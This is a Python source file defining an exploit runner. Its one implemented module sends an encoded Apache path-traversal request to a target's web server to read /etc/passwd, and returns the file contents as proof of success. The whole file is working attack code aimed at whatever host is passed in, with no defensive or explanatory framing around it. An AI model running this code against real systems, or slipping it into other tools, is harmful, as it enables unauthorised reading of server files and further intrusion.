import requests

class ExploitRunner:

    def run(self, exploit_id, target):
        if exploit_id == "exploit/multi/http/apache_normalize_path_rce":
            return self.apache_path_traversal(target)

        return {
            "status": False,
            "proof": "Exploit not implemented"
        }

    def apache_path_traversal(self, target):
        url = f"http://{target}:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

        try:
            r = requests.get(url, timeout=5)

            if "root:x:" in r.text:
                return {
                    "status": True,
                    "proof": "/etc/passwd read",
                    "data": r.text[:2000]
                }

            return {
                "status": False,
                "proof": "Target did not return passwd"
            }

        except Exception as e:
            return {
                "status": False,
                "proof": str(e)
            }
